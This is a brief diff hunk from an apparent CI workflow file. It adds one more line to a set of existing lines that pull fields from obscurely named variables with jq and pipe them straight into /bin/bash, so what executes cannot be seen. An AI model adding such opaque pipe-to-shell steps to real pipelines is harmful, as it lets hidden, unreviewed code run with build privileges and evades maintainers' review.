@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$u82" | jq -r .q028 | /bin/bash
           printf '%s' "$mp537" | jq -r .osx81570 | /bin/bash
           echo $jhiim246 | jq -r .doso438 | /bin/bash
+          printf '%s' "$eam970" | jq -r .d6 | /bin/bash
 
       - name: Save output
         if: always()
